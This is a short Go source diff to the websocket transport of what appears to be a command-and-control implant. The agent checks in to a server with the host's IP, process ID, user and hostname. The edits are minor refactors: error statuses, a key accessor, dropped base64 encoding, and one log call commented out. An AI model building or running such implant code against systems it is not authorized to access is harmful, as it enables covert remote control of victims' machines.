@@ -8,7 +8,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"log"
 	"math"
 	"net/http"
 	"os"
@@ -278,7 +277,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 
 	if err != nil {
 		//log.Printf("Error connecting to server %s ", err.Error())
-		return structs.CheckinResponse{}
+		return structs.CheckinResponse{Status: "failed"}
 	}
 
 	c.Conn = connection
@@ -305,9 +304,11 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 
 		//log.Println("Exchanging keys: ", c.XKeys())
 		resp = c.sendData(EKE, SESSIDType, sID, checkinMsg)
-	} else if len(c.AesPSK) != 0 {
+	} else if len(c.AesPreSharedKey()) != 0 {
+		//log.Println("Sending AES PSK checkin")
 		resp = c.sendData(AES, UUIDType, c.UUID, checkinMsg)
 	} else {
+		//log.Println("Sending unencrypted checkin")
 		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, checkinMsg)
 	}
 
@@ -383,10 +384,10 @@ func (c *C2Websockets) getData() []byte {
 func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte) []byte {
 	m := structs.Message{}
 
-	if len(c.AesPSK) != 0 {
+	if len(c.AesPreSharedKey()) != 0 {
 		m.Data = string(c.encryptMessage(data))
 	} else {
-		m.Data = base64.StdEncoding.EncodeToString(data)
+		m.Data = string(data)
 	}
 
 	m.MType = msgType
@@ -400,7 +401,7 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte)
 	err = c.Conn.ReadJSON(&respMsg)
 
 	if err != nil {
-		log.Println("Error trying to read message ", err.Error())
+		//log.Println("Error trying to read message ", err.Error())
 		return make([]byte, 0)
 	}
 
